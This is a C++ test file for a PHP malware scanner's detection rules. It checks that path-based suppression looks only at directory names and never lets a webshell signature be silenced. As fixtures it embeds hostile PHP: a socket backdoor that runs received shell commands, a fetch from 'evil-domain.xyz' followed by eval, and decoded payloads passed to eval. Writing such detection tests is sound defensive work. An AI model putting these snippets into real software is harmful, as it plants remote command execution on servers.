// Location priors: what a path may decide about a match, and what it may not.
//
// THE DEFECT
// ----------
// The release build of 8 September reported a Critical FilesMan webshell signature
// (WS006) for shell.php and nothing for shell_test.php or shellTest.php - the same bytes
// in the same directory under three names. WS006's context filter skipped any path
// containing `Test.php` or `_test.php`: fragments with no separator in them, so they
// matched inside a file name, and a file's name is chosen by whoever dropped the file.
// Unlike the separator defect the previous round fixed, this held on every platform and
// had since before any normalisation existed. Seven fragments across the filters had
// that shape (Test.php, _test.php, testdata, phpseclib, sodium, openssl, php-jwt), BD005
// carried ten more (ftp, socket, Handler.php, Guzzle ...), and OBF004 looked for `.js`
// anywhere in the path.
//
// THE TWO DECISIONS, pinned here
// ------------------------------
// 1. A signature has no location prior. Every WS rule matches the name of a malware
//    family, and nothing about where a file sits is evidence about that. WS006's filter
//    is gone, and NoWebshellRuleIsSuppressedByAnyPath fails the day any WS rule grows
//    one. Where a name prior was standing in for pattern precision, the pattern now says
//    what it meant: WS006 matches a token, BD005 a call.
// 2. A heuristic's location prior is a DIRECTORY, compared case-insensitively. Every
//    fragment matches a whole directory component - or, for a product name, sits inside
//    one - and never the trailing file name. An upload primitive hands an attacker a
//    name; a directory is a different capability, and it is accepted per rule with the
//    trade stated at the prior.
//
// WHAT EACH BLOCK CHECKS
// ----------------------
//   The two helpers as pure functions: the name is excluded, case is folded, an exact
//     name stays exact, a product name matches inside a component.
//   The repro, dead: identical bytes under an evasive name and a plain name get the same
//     verdict, in memory and on disk through Scanner::scanFile the way `check` reads.
//   No WS rule can be suppressed by any path ever used as a fragment.
//   The two patterns that replaced a name prior, both directions: WS006 keeps the Magento
//     lines out and every FilesMan spelling in; BD005 keeps WordPress core's FTP class
//     out under any name and a socket backdoor in under any name.
//   Every kept prior, one row per fragment: a directory of that name suppresses in three
//     spellings, a file named with it fires in three spellings, an exact name stays exact
//     and a product name matches inside a directory. In memory and on disk, every row.
//   The real vendored files the priors exist for: lines byte for byte from the stock
//     trees, suppressed at their real path and reported in uploads - and the stock copy
//     itself, read from disk when the trees are on this machine.
//   Case folding on the shape that motivated it, both directions: Magento's Test/Unit/.

#include <gtest/gtest.h>

#include "config/Config.h"
#include "core/MatchEngine.h"
#include "core/Scanner.h"
#include "rules/Registry.hpp"

#include <algorithm>
#include <cctype>
#include <cstdint>
#include <filesystem>
#include <fstream>
#include <initializer_list>
#include <random>
#include <sstream>
#include <string>
#include <string_view>
#include <vector>

using namespace lyxbosa;

namespace {

namespace fs = std::filesystem;

// Rule fixtures. Each matches its rule's pattern and trips none of that rule's
// content-based filters, so the path is the only thing deciding the outcome.

// WS006: the signature and nothing else - the repro's file, byte for byte.
constexpr std::string_view kFilesMan = "<?php $x = \"FilesMan\"; echo $x;\n";

// OBF003: 30 hex digits, and not the rsaEncryption OID the filter always lets through.
constexpr std::string_view kPackHex =
    "<?php\n$bin = pack('H*', '48656c6c6f20576f726c6421486921');\n";

// OBF002: four chained chr() calls whose values are not an ascending run.
constexpr std::string_view kChrChain =
    "<?php\n$f = chr(112) . chr(104) . chr(112) . chr(95) . chr(117);\n";

// OBF010 / OBF011: decoded straight into eval, with no json_decode or htmlentities in
// reach.
constexpr std::string_view kGzuncompressEval =
    "<?php\n$d = gzuncompress(base64_decode($x));\neval($d);\n";
constexpr std::string_view kRawurldecodeEval =
    "<?php\n$p = rawurldecode(base64_decode($_POST['d']));\neval($p);\n";

// BD013: a private-key marker with key data on the next line, not inside a comment.
constexpr std::string_view kPrivateKey =
    "<?php\n$key = '-----BEGIN RSA PRIVATE KEY-----\n"
    "MIIEpAIBAAKCAQEA0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\n"
    "-----END RSA PRIVATE KEY-----';\n";

// DRP001: a remote fetch with eval more than 500 bytes away, which is where the vendor
// path skip applies; in reach of the fetch the rule keeps the match whatever the path.
std::string remoteFetchThenDistantEval() {
    std::string s = "<?php\n$code = file_get_contents('https://evil-domain.xyz/p.txt');\n";
    s += std::string(600, ' ');
    s += "\neval($code);\n";
    return s;
}

// OBF036: 800 bytes of uniform pseudo-random content ahead of PHP source - the shape of
// an encrypted stage, and the same generator tests/rules_test.cpp uses for the rule.
std::string blobThenPhp() {
    std::string s;
    uint32_t state = 0x1d0f461cu;
    for (int i = 0; i < 800; ++i) {
        state = state * 1664525u + 1013904223u;
        s.push_back(static_cast<char>((state >> 16) & 0xFF));
    }
    s += "<?php goto vSHrlRg; $x = 1; ?>";
    return s;
}

// BD005, the real thing: the shape tests/rules_test.cpp has always used for the rule.
constexpr std::string_view kSocketBackdoor =
    "<?php\n"
    "$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\n"
    "socket_connect($sock, $_GET['ip'], $_GET['port']);\n"
    "while($cmd = socket_read($sock, 2048)) {\n"
    "    $out = shell_exec($cmd);\n"
    "    socket_write($sock, $out);\n"
    "}\n";

// BD005, the false positive the name prior was shielding: WordPress core's
// wp-admin/includes/class-ftp-sockets.php, the lines that matter. socket_create() on a
// line with none of the rule's context words, and the class's own `_exec()` FTP-command
// method further down, which a bare `exec` alternative reached across 40 lines.
constexpr std::string_view kWordPressFtpSockets =
    "<?php\n"
    "class ftp_sockets extends ftp_base {\n"
    "\tfunction _connect($host, $port) {\n"
    "\t\tif(!($sock = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP))) {\n"
    "\t\t\t$this->PushError('_connect','socket create failed', socket_strerror(socket_last_error($sock)));\n"
    "\t\t\treturn FALSE;\n"
    "\t\t}\n"
    "\t\treturn $sock;\n"
    "\t}\n"
    "\tfunction _exec($cmd, $fn=\"_exec\") {\n"
    "\t\tif(!$this->_putcmd($cmd)) return FALSE;\n"
    "\t\treturn $this->_readmsg($fn);\n"
    "\t}\n"
    "\tfunction _data_prepare($mode=FTP_ASCII) {\n"
    "\t\tif(!$this->_exec(\"PASV\", \"pasv\")) return FALSE;\n"
    "\t\t$this->executed = 1;\n"
    "\t}\n"
    "}\n";

// OBF003, the real vendored lines the prior exists for, byte for byte from the stock
// trees. PhpSpreadsheet's Xls writer (the 47th finding of the previous round) and
// phpseclib's RSA - a PKCS#1 DigestInfo prefix, which is NOT the rsaEncryption OID the
// content test exempts, so only the location decides.
constexpr std::string_view kPhpSpreadsheetXlsWriter =
    "<?php\n        $unknown1 = pack('H*', 'D0C9EA79F9BACE118C8200AA004BA90B02000000');\n";
constexpr std::string_view kPhpseclibRsa =
    "<?php\n                $t = pack('H*', '3020300c06082a864886f70d020205000410');\n";

// Every string any context filter has ever tested a path against, in the spelling it
// used. The signature case drives each one through every WS rule; a list that shrinks
// is a list that stopped checking something, so its size is asserted too.
const std::vector<std::string> kEveryFragmentEverUsed = {
    // directories
    "vendor", "tests", "test", "testdata", "fixtures", "fixture", ".ssh", "wflogs",
    "third-party", "third_party", "vendor-prefixed", "phpseclib", "crypt",
    // OBF003's former bare substrings
    "sodium", "openssl", "php-jwt",
    // product names
    "revslider", "revolution-slider", "LayerSlider", "theme-options", "redux-framework",
    "js_composer", "wpbakery", "visual-composer", "elementor", "divi", "beaver-builder",
    "googlefonts", "google-fonts",
    // BD005's former list
    "ftp", "socket", "class-ftp", "FTP", "Socket", "monolog", "Monolog", "Handler.php",
    "Guzzle",
    // WS006's former name fragments, and OBF004's
    "_test.php", "Test.php", ".js",
};

std::string upper(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(),
                   [](unsigned char c) { return static_cast<char>(std::toupper(c)); });
    return s;
}

std::string capitalised(std::string s) {
    for (auto& c : s) {
        if (std::isalpha(static_cast<unsigned char>(c))) {
            c = static_cast<char>(std::toupper(static_cast<unsigned char>(c)));
            break;
        }
    }
    return s;
}

// A gtest-safe name for a fragment, distinct for third-party and third_party.
std::string ident(std::string_view s) {
    std::string out;
    for (char c : s) {
        if (std::isalnum(static_cast<unsigned char>(c))) out.push_back(c);
        else if (c == '-') out.push_back('_');
        else if (c == '_') out += "U";
        else out += "Dot";
    }
    return out;
}

class LocationPriorFixture : public ::testing::Test {
protected:
    MatchEngine engine;

    void SetUp() override { engine.loadAllBuiltinRules(); }

    bool fires(std::string_view rule, std::string_view content, std::string_view path) {
        for (const auto& m : engine.match(content, path)) {
            if (m.category == rule) return true;
        }
        return false;
    }
};

// A real file on disk, read through Scanner::scanFile the way `check` does, so a case
// about a NAME is a case about a name the platform actually stored.
class OnDiskFixture : public LocationPriorFixture {
protected:
    fs::path root;

    void SetUp() override {
        LocationPriorFixture::SetUp();
        root = fs::temp_directory_path() /
               ("lyxbosa-location-prior-" + std::to_string(std::random_device{}()));
        fs::create_directories(root);
    }
    void TearDown() override {
        std::error_code ec;
        fs::remove_all(root, ec);
    }

    static bool scanFires(std::string_view rule, const fs::path& file) {
        AppConfig config = Config::loadFromString(Config::generateDefault());
        config.archives.enabled = false;
        config.actions.quarantine.enabled = false;
        Scanner scanner(config);

        const FileResult result = scanner.scanFile(file);
        EXPECT_FALSE(result.skipped()) << file << " was not read";
        for (const auto& m : result.matches) {
            if (m.category == rule) return true;
        }
        return false;
    }

    bool firesOnDisk(std::string_view rule, std::string_view content, std::string_view relative) {
        const fs::path file = root / std::string(relative);
        fs::create_directories(file.parent_path());
        {
            std::ofstream out(file, std::ios::binary | std::ios::trunc);
            EXPECT_TRUE(out.good()) << "could not write " << file;
            out.write(content.data(), static_cast<std::streamsize>(content.size()));
        }
        return scanFires(rule, file);
    }
};

// The stock trees are gitignored and fetched, so a case that reads one says so and
// skips where they are absent rather than passing on nothing.
std::optional<fs::path> stockFile(std::string_view relative) {
    fs::path dir = fs::current_path();
    for (int up = 0; up < 5; ++up) {
        const fs::path candidate = dir / std::string(relative);
        if (fs::exists(candidate)) return candidate;
        if (!dir.has_parent_path() || dir.parent_path() == dir) break;
        dir = dir.parent_path();
    }
    return std::nullopt;
}

}  // namespace

// ===========================================================================
// The helpers - pure functions, the same on every platform
// ===========================================================================

TEST(UnderDirectoryNamedTest, ADirectoryComponentOfThatNameMatches) {
    EXPECT_TRUE(MatchEngine::underDirectoryNamed("wp-content/plugins/foo/vendor/lib.php", "vendor"));
    EXPECT_TRUE(MatchEngine::underDirectoryNamed("vendor/lib.php", "vendor"));
    EXPECT_TRUE(MatchEngine::underDirectoryNamed("/vendor/lib.php", "vendor"));
    EXPECT_TRUE(MatchEngine::underDirectoryNamed("a//vendor//lib.php", "vendor"));
    EXPECT_TRUE(MatchEngine::underDirectoryNamed("site/backup.zip!/wp-content/vendor/lib.php", "vendor"))
        << "an archive member is addressed like a path and its directories count";
    EXPECT_TRUE(MatchEngine::underDirectoryNamed("home/deploy/.ssh/id_rsa", ".ssh"));
}

TEST(UnderDirectoryNamedTest, TheFileNameIsNeverConsulted) {
    EXPECT_FALSE(MatchEngine::underDirectoryNamed("wp-content/uploads/vendor", "vendor"))
        << "the last component is the file name, whatever it is called";
    EXPECT_FALSE(MatchEngine::underDirectoryNamed("wp-content/uploads/vendor.php", "vendor"));
    EXPECT_FALSE(MatchEngine::underDirectoryNamed("vendor", "vendor"));
    EXPECT_FALSE(MatchEngine::underDirectoryNamed("", "vendor"));
    EXPECT_FALSE(MatchEngine::underDirectoryNamed("wp-content/uploads/tests\\shell.php", "tests"))
        << "a backslash is a name character here; filterPath() is what makes it a separator on Windows";
}

TEST(UnderDirectoryNamedTest, CaseIsFolded) {
    EXPECT_TRUE(MatchEngine::underDirectoryNamed("wp-content/plugins/foo/Vendor/lib.php", "vendor"));
    EXPECT_TRUE(MatchEngine::underDirectoryNamed("wp-content/plugins/foo/VENDOR/lib.php", "vendor"));
    EXPECT_TRUE(MatchEngine::underDirectoryNamed("app/code/Magento/Foo/Test/Unit/BarTest.php", "test"));
    EXPECT_TRUE(MatchEngine::underDirectoryNamed("lib/PHPSecLib/Crypt/RSA.php", "phpseclib"));
    EXPECT_TRUE(MatchEngine::underDirectoryNamed("lib/PHPSecLib/Crypt/RSA.php", "crypt"));
}

TEST(UnderDirectoryNamedTest, AnExactNameStaysExact) {
    EXPECT_FALSE(MatchEngine::underDirectoryNamed("wp-content/vendors/lib.php", "vendor"));
    EXPECT_FALSE(MatchEngine::underDirectoryNamed("wp-content/my-vendor/lib.php", "vendor"));
    EXPECT_FALSE(MatchEngine::underDirectoryNamed("wp-content/vendor-prefixed/lib.php", "vendor"));
    EXPECT_FALSE(MatchEngine::underDirectoryNamed("wp-content/uploads/latest/x.php", "test"));
    EXPECT_FALSE(MatchEngine::underDirectoryNamed("wp-content/testsuite/x.php", "test"));
    EXPECT_FALSE(MatchEngine::underDirectoryNamed("lib/encrypt/x.php", "crypt"));
}

TEST(UnderDirectoryContainingTest, AProductNameMatchesInsideADirectoryComponent) {
    EXPECT_TRUE(MatchEngine::underDirectoryContaining("wp-content/plugins/elementor/x.php", "elementor"));
    EXPECT_TRUE(MatchEngine::underDirectoryContaining("wp-content/plugins/elementor-pro/x.php", "elementor"));
    EXPECT_TRUE(MatchEngine::underDirectoryContaining(
        "wp-content/plugins/essential-addons-for-elementor-lite/x.php", "elementor"));
    EXPECT_TRUE(MatchEngine::underDirectoryContaining("wp-content/plugins/Elementor/x.php", "elementor"));
    EXPECT_TRUE(MatchEngine::underDirectoryContaining("wp-content/themes/Divi/x.php", "divi"));
}

TEST(UnderDirectoryContainingTest, TheFileNameIsNeverConsulted) {
    EXPECT_FALSE(MatchEngine::underDirectoryContaining("wp-content/uploads/elementor.php", "elementor"));
    EXPECT_FALSE(MatchEngine::underDirectoryContaining("wp-content/uploads/my-elementor-widget.php", "elementor"));
    EXPECT_FALSE(MatchEngine::underDirectoryContaining("elementor.php", "elementor"));
    EXPECT_FALSE(MatchEngine::underDirectoryContaining("wp-content/uploads/x.php", ""))
        << "an empty fragment matches nothing rather than everything";
}

// ===========================================================================
// The repro, dead
// ===========================================================================

class LocationPriorTest : public LocationPriorFixture {};

TEST_F(LocationPriorTest, WS006_IdenticalBytesGetTheSameVerdictUnderEveryName) {
    for (const char* path : {
             "shell.php", "shell_test.php", "shellTest.php", "Test.php", "_test.php",
             "wp-content/uploads/shell.php", "wp-content/uploads/shell_test.php",
             "wp-content/uploads/shellTest.php", "wp-content/uploads/SHELL_TEST.PHP",
             "tests/shell.php", "test/shell.php", "Tests/shell.php", "Test/Unit/shell.php",
             "vendor/shell.php", "wp-content/plugins/x/vendor/tests/shellTest.php",
             "dev/tests/static/testsuite/Magento/Test/Legacy/_files/obsolete_classes.php",
         }) {
        EXPECT_TRUE(fires("WS006", kFilesMan, path))
            << "a Critical signature was silent for " << path << " - the name decided";
    }
}

class LocationPriorOnDiskTest : public OnDiskFixture {};

// The three files of the repro, plus the directory shapes, on disk and read the way
// `check` reads them.
TEST_F(LocationPriorOnDiskTest, WS006_TheReproIsDead) {
    for (const char* relative : {"shell.php", "shell_test.php", "shellTest.php",
                                 "tests/shell.php", "Test/shell.php", "vendor/shell.php"}) {
        EXPECT_TRUE(firesOnDisk("WS006", kFilesMan, relative))
            << "identical bytes, different verdict, for " << relative;
    }
}

// ===========================================================================
// A signature has no location prior
// ===========================================================================

TEST(SignatureRulesTest, NoWebshellRuleIsSuppressedByAnyPath) {
    const auto webshellRules = rules::Registry::instance().getByCategory(rules::Category::Webshell);
    ASSERT_GE(webshellRules.size(), 11u)
        << "discovery found too few WS rules for this case to mean anything";
    ASSERT_GE(kEveryFragmentEverUsed.size(), 40u)
        << "the fragment list shrank; a shorter list checks less";

    const std::string content = "<?php $a = 'FilesMan'; echo $a;\n";
    const size_t off = content.find("FilesMan");
    ASSERT_NE(off, std::string::npos);

    std::vector<std::string> paths;
    for (const auto& f : kEveryFragmentEverUsed) {
        paths.push_back("x/" + f + "/shell.php");             // a directory of that name
        paths.push_back("x/" + upper(f) + "/shell.php");      // folded
        paths.push_back("x/" + f + ".php");                   // a file of that name
        paths.push_back("x/shell" + f);                       // the name ends in it
        paths.push_back("x/" + f + "shell.php");              // the name starts with it
        paths.push_back(f + "/" + f + ".php");                // both
    }

    for (const auto* rule : webshellRules) {
        const std::string code = rule->code.toString();
        for (const auto& path : paths) {
            MatchContext ctx;
            ctx.content = content;
            ctx.filePath = path;
            ctx.matchOffset = off;
            ctx.matchLine = 1;
            ctx.matchColumn = off + 1;
            ctx.matchedText = std::string_view(content).substr(off, 8);
            EXPECT_TRUE(MatchEngine::applyContextFilter(code, ctx))
                << code << " was suppressed by the path " << path
                << " - a webshell signature is decided by its bytes alone";
        }
    }
}

// ===========================================================================
// The two patterns that replaced a name prior
// ===========================================================================

// WS006 matches a token. Every real spelling fires; the inside of a longer identifier -
// the only benign occurrence in 214,675 stock files, twice, in a Magento list of
// obsolete class names - does not, and no path is involved either way.
TEST_F(LocationPriorTest, WS006_TheSignatureIsATokenAndEverySpellingOfItFires) {
    for (const char* line : {
             "$default_action = 'FilesMan';",
             "function actionFilesMan() {",
             "case 'FilesMan':",
             "if(isset($_POST['a']) && $_POST['a'] == 'FilesMan') {",
             "$a = \"Fil3sM4n\";",
             "$x = \"FilesMan\"; echo $x;",
         }) {
        const std::string content = std::string("<?php\n") + line + "\n";
        EXPECT_TRUE(fires("WS006", content, "app/code/x.php")) << line;
    }
    EXPECT_TRUE(fires("WS006", "<?php // FilesMan", "app/code/x.php"))
        << "a token at the very end of the file is still a token";
}

TEST_F(LocationPriorTest, WS006_TheInsideOfALongerIdentifierIsNotTheSignature) {
    // The two Magento lines, byte for byte.
    const std::string obsoleteClasses =
        "<?php\nreturn [\n"
        "    ['Magento\\Core\\Model\\View\\DeployedFilesManager', 'Magento\\Framework\\View\\AssetInterface'],\n"
        "];\n";
    const std::string obsoleteMethods =
        "<?php\nreturn [\n"
        "        'Magento\\Framework\\View\\PublicFilesManagerInterface',\n"
        "];\n";
    for (const char* path : {
             "dev/tests/static/testsuite/Magento/Test/Legacy/_files/obsolete_classes.php",
             "app/code/Magento/Foo/Model/FilesManager.php",
             "wp-content/uploads/x.php",
         }) {
        EXPECT_FALSE(fires("WS006", obsoleteClasses, path)) << path;
        EXPECT_FALSE(fires("WS006", obsoleteMethods, path)) << path;
        EXPECT_FALSE(fires("WS006", "<?php\nclass FilesManager {}\n", path)) << path;
    }
}

// BD005 asks for a CALL to a shell function. WordPress core's FTP class is clean by
// content, under its own name and under any other; a socket backdoor fires under its
// own name and under every name the old list would have shielded.
TEST_F(LocationPriorTest, BD005_WordPressCoreFtpClassIsCleanByContentUnderAnyName) {
    for (const char* path : {
             "wp-admin/includes/class-ftp-sockets.php",
             "wp-content/uploads/x.php",
             "wp-content/uploads/ftp.php",
             "tests/x.php",
         }) {
        EXPECT_FALSE(fires("BD005", kWordPressFtpSockets, path))
            << "WordPress core's own FTP class reported as a backdoor at " << path;
    }
}

TEST_F(LocationPriorTest, BD005_ASocketBackdoorFiresUnderEveryNameTheOldListShielded) {
    for (const char* path : {
             "wp-content/uploads/backdoor.php",
             "wp-admin/includes/class-ftp-sockets.php",
             "wp-content/uploads/ftp.php",
             "wp-content/uploads/socket.php",
             "wp-content/uploads/MyHandler.php",
             "wp-content/plugins/x/vendor/monolog/monolog/src/Monolog/Handler/SocketHandler.php",
             "wp-content/plugins/x/vendor-prefixed/guzzlehttp/guzzle/src/Handler/CurlHandler.php",
         }) {
        EXPECT_TRUE(fires("BD005", kSocketBackdoor, path))
            << "a socket backdoor was silent at " << path << " - BD005 has no location prior";
    }
}

TEST_F(LocationPriorTest, BD005_TheShellFunctionIsACallAtAWordBoundary) {
    auto withTail = [](const char* tail) {
        return std::string("<?php\n$s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\n") + tail + "\n";
    };
    EXPECT_TRUE(fires("BD005", withTail("$o = @exec($c);"), "x/y.php"));
    EXPECT_TRUE(fires("BD005", withTail("$o = system($c);"), "x/y.php"));
    EXPECT_TRUE(fires("BD005", withTail("$o = passthru ($c);"), "x/y.php"));
    EXPECT_TRUE(fires("BD005", withTail("$h = popen($c, 'r');"), "x/y.php"));
    EXPECT_TRUE(fires("BD005", withTail("$o = shell_exec($c);"), "x/y.php"));

    EXPECT_FALSE(fires("BD005", withTail("$o = $this->_exec($c);"), "x/y.php"))
        << "_exec is an identifier that contains the word, not a call to it";
    EXPECT_FALSE(fires("BD005", withTail("$o = $db->execute($c);"), "x/y.php"));
    EXPECT_FALSE(fires("BD005", withTail("$this->executed = 1;"), "x/y.php"));
    // Stated trade: an indirect call is the business of the dynamic-call rules, not this one.
    EXPECT_FALSE(fires("BD005", withTail("$f = 'system'; $f($c);"), "x/y.php"));
}

// ===========================================================================
// Every kept prior, one row per fragment
// ===========================================================================

namespace {

enum class Kind { Named, Containing };

struct PriorCase {
    const char* rule;
    std::string content;
    const char* directory;
    Kind kind;
};

std::ostream& operator<<(std::ostream& os, const PriorCase& c) {
    return os << c.rule << " under " << c.directory;
}

std::vector<PriorCase> priorCases() {
    std::vector<PriorCase> out;
    auto add = [&](const char* rule, std::string_view content, Kind kind,
                   std::initializer_list<const char*> dirs) {
        for (const char* d : dirs) out.push_back({rule, std::string(content), d, kind});
    };
    add("OBF003", kPackHex, Kind::Named,
        {"vendor", "third-party", "third_party", "vendor-prefixed", "phpseclib", "crypt"});
    add("OBF002", kChrChain, Kind::Named, {"vendor", "tests", "test"});
    add("OBF010", kGzuncompressEval, Kind::Named, {"vendor", "vendor-prefixed"});
    add("OBF010", kGzuncompressEval, Kind::Containing,
        {"revslider", "revolution-slider", "layerslider", "theme-options", "redux-framework"});
    add("OBF011", kRawurldecodeEval, Kind::Named, {"vendor", "vendor-prefixed"});
    add("OBF011", kRawurldecodeEval, Kind::Containing,
        {"js_composer", "wpbakery", "visual-composer", "elementor", "divi", "beaver-builder"});
    add("DRP001", remoteFetchThenDistantEval(), Kind::Named, {"vendor", "vendor-prefixed"});
    add("DRP001", remoteFetchThenDistantEval(), Kind::Containing,
        {"revslider", "googlefonts", "google-fonts"});
    add("BD013", kPrivateKey, Kind::Named,
        {"tests", "test", "testdata", "fixtures", "fixture", ".ssh"});
    add("OBF036", blobThenPhp(), Kind::Named, {"wflogs"});
    return out;
}

const std::vector<PriorCase> kPriorCases = priorCases();

}  // namespace

class EveryLocationPriorTest : public LocationPriorFixture,
                               public ::testing::WithParamInterface<PriorCase> {};

// A directory of that name suppresses, in every spelling of its case.
TEST_P(EveryLocationPriorTest, ADirectoryOfThatNameSuppressesInAnyCase) {
    const PriorCase& c = GetParam();
    const std::string d = c.directory;
    for (const std::string& path : std::vector<std::string>{
             "wp-content/" + d + "/x.php",
             "wp-content/" + upper(d) + "/x.php",
             "wp-content/" + capitalised(d) + "/x.php",
             "site/" + d + "/a/b/x.php",
             d + "/x.php",
         }) {
        EXPECT_FALSE(fires(c.rule, c.content, path)) << c << " should be suppressed under " << path;
    }
}

// A file NAMED with it fires, in every spelling of its case: folding reaches directories
// and nothing else.
TEST_P(EveryLocationPriorTest, AFileNamedWithItFiresInAnyCase) {
    const PriorCase& c = GetParam();
    const std::string d = c.directory;
    for (const std::string& path : std::vector<std::string>{
             "wp-content/uploads/" + d + ".php",
             "wp-content/uploads/" + upper(d) + ".php",
             "wp-content/uploads/x" + d + ".php",
             "wp-content/uploads/" + d + "x.php",
             d + ".php",
             "wp-content/uploads/x.php",                    // the plain control
         }) {
        EXPECT_TRUE(fires(c.rule, c.content, path))
            << c << " was suppressed for a file NAMED " << path;
    }
}

// An exact name is exact; a product name matches inside a directory component.
TEST_P(EveryLocationPriorTest, AnExactNameStaysExactAndAProductNameMatchesInside) {
    const PriorCase& c = GetParam();
    const std::string d = c.directory;
    for (const std::string& path : std::vector<std::string>{"wp-content/" + d + "-x/x.php",
                                                            "wp-content/x-" + d + "/x.php"}) {
        if (c.kind == Kind::Named) {
            EXPECT_TRUE(fires(c.rule, c.content, path))
                << c << " is a directory NAME and " << path << " is not it";
        } else {
            EXPECT_FALSE(fires(c.rule, c.content, path))
                << c << " is a product name and " << path << " is one of its directories";
        }
    }
}

class EveryLocationPriorOnDiskTest : public OnDiskFixture,
                                     public ::testing::WithParamInterface<PriorCase> {};

// On disk, both directions: a real directory suppresses, a real file of that name
// fires, read the way `check` reads them.
TEST_P(EveryLocationPriorOnDiskTest, ARealDirectorySuppressesAndARealNameFires) {
    const PriorCase& c = GetParam();
    const std::string d = c.directory;
    EXPECT_FALSE(firesOnDisk(c.rule, c.content, d + "/x.php")) << c << " under a real directory";
    EXPECT_FALSE(firesOnDisk(c.rule, c.content, upper(d) + "/x.php")) << c << " under a real folded directory";
    EXPECT_TRUE(firesOnDisk(c.rule, c.content, "uploads/" + d + ".php")) << c << " as a real file name";
    EXPECT_TRUE(firesOnDisk(c.rule, c.content, "uploads/x" + upper(d) + ".php")) << c << " as a real file name";
    EXPECT_TRUE(firesOnDisk(c.rule, c.content, "uploads/x.php")) << c << " control";
}

INSTANTIATE_TEST_SUITE_P(Priors, EveryLocationPriorTest, ::testing::ValuesIn(kPriorCases),
                         [](const ::testing::TestParamInfo<PriorCase>& info) {
                             return std::string(info.param.rule) + "_" + ident(info.param.directory);
                         });
INSTANTIATE_TEST_SUITE_P(Priors, EveryLocationPriorOnDiskTest, ::testing::ValuesIn(kPriorCases),
                         [](const ::testing::TestParamInfo<PriorCase>& info) {
                             return std::string(info.param.rule) + "_" + ident(info.param.directory);
                         });

// ===========================================================================
// The real vendored files the priors exist for
// ===========================================================================

TEST_F(LocationPriorTest, OBF003_RealVendoredLinesAreSuppressedAtTheirRealPathAndReportedInUploads) {
    // Where each one actually sits in a stock plugin.
    EXPECT_FALSE(fires("OBF003", kPhpSpreadsheetXlsWriter,
                       "wp-content/plugins/woo-order-export-lite/classes/vendor/phpoffice/"
                       "phpspreadsheet/src/PhpSpreadsheet/Writer/Xls/Worksheet.php"));
    EXPECT_FALSE(fires("OBF003", kPhpseclibRsa,
                       "wp-content/plugins/updraftplus/vendor/phpseclib/phpseclib/phpseclib/Crypt/RSA.php"));
    EXPECT_FALSE(fires("OBF003", kPhpseclibRsa,
                       "wp-content/plugins/google-site-kit/third-party/phpseclib/phpseclib/phpseclib/Crypt/RSA.php"));
    // Forminator's hub-connector copy sits under no vendor directory and spells the
    // library in capitals: the case that kept reporting until OBF003 folded, and the
    // reason folding is now the rule for every prior.
    EXPECT_FALSE(fires("OBF003", kPhpseclibRsa,
                       "wp-content/plugins/forminator/library/lib/hub-connector/lib/PHPSecLib/Crypt/RSA.php"));

    // The same bytes anywhere else are a finding.
    for (const char* path : {
             "wp-content/uploads/Worksheet.php", "wp-content/uploads/RSA.php",
             "wp-content/uploads/phpseclib.php", "wp-content/uploads/PHPSecLib-Crypt-RSA.php",
             "wp-content/uploads/vendor.php",
         }) {
        EXPECT_TRUE(fires("OBF003", kPhpSpreadsheetXlsWriter, path)) << path;
        EXPECT_TRUE(fires("OBF003", kPhpseclibRsa, path)) << path;
    }
}

// The stock copy itself, when the trees are on this machine: read from disk at its real
// path it is suppressed, and copied byte for byte into an uploads directory it fires.
TEST_F(LocationPriorOnDiskTest, OBF003_TheStockForminatorCopyIsSuppressedInPlaceAndReportedInUploads) {
    const auto real = stockFile(
        "trail-data/CMS-ext/wp-plugin/forminator-1.57.2/forminator/library/lib/hub-connector/"
        "lib/PHPSecLib/Crypt/RSA.php");
    if (!real) {
        GTEST_SKIP() << "the stock trees are not on this machine (corpus/fetch-benign.sh); "
                        "the embedded lines above are checked everywhere";
    }
    EXPECT_FALSE(scanFires("OBF003", *real)) << "the stock copy at its real path";

    std::ifstream in(*real, std::ios::binary);
    std::stringstream buf;
    buf << in.rdbuf();
    const std::string bytes = buf.str();
    ASSERT_FALSE(bytes.empty());
    EXPECT_TRUE(firesOnDisk("OBF003", bytes, "wp-content/uploads/RSA.php"))
        << "the same bytes in uploads";
}

// ===========================================================================
// Case folding, on the shape that motivated it
// ===========================================================================

// Magento spells its test directories Test/Unit/. OBF002 did not fold before and so
// reported chr() tables there on Linux while Windows, case-insensitive, did not; BD013
// folded already. Both now agree, and both directions are pinned: the directory in any
// case suppresses, the same word in a file name in any case does not.
TEST_F(LocationPriorTest, CaseFolding_MagentoTestDirectoriesSuppressAndTestNamedFilesDoNot) {
    for (const char* path : {
             "app/code/Magento/Foo/Test/Unit/BarTest.php",
             "app/code/Magento/Foo/TEST/Unit/x.php",
             "dev/Tests/x.php",
             "src/tests/x.php",
         }) {
        EXPECT_FALSE(fires("OBF002", kChrChain, path)) << path;
        EXPECT_FALSE(fires("BD013", kPrivateKey, path)) << path;
    }
    for (const char* path : {
             "app/code/Magento/Foo/Model/FooTest.php",
             "app/code/Magento/Foo/Unit/TestBar.php",
             "app/code/Magento/Foo/Unit/TESTS.php",
             "app/code/Magento/Foo/Unit/test_x.php",
             "wp-content/uploads/x.php",
         }) {
        EXPECT_TRUE(fires("OBF002", kChrChain, path)) << path;
        EXPECT_TRUE(fires("BD013", kPrivateKey, path)) << path;
    }
}

// OBF004's extension test is an extension test: the trailing extension only, folded.
TEST_F(LocationPriorTest, OBF004_TheScriptExtensionIsTheTrailingExtensionOnly) {
    const std::string longB64 = "<?php\n$p = base64_decode('" + std::string(600, 'A') + "');\n";
    for (const char* path : {"x/app.js", "x/app.JS", "x/app.min.js", "x/app.json", "x/app.jsx", "x/app.mjs"}) {
        EXPECT_FALSE(fires("OBF004", longB64, path)) << path;
    }
    for (const char* path : {"x/shell.js.php", "x/node_modules/intro.js/shell.php", "x/.js/shell.php",
                             "x/shell.php", "x/shelljs.php"}) {
        EXPECT_TRUE(fires("OBF004", longB64, path)) << path;
    }
}
